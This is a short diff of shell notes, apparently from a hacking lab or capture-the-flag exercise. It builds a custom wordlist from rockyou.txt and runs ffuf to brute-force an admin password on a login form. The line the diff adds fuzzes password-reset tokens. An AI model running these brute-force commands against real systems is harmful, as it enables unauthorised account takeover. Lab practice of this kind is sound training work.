@@ -16,4 +16,5 @@ grep: rockyou.txt: binary file matches
 151647 custom_wordlist.txt
 ┌─[root@parrot]─[/usr/share/wordlists]
 └──╼ #ffuf -w ./custom_wordlist.txt -u http://94.237.121.100:47395/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
+──╼ $ffuf -w ./tokens.txt -u http://94.237.60.219:39636/reset_password.php?token=FUZZ -fr "The provided token is invalid"
 
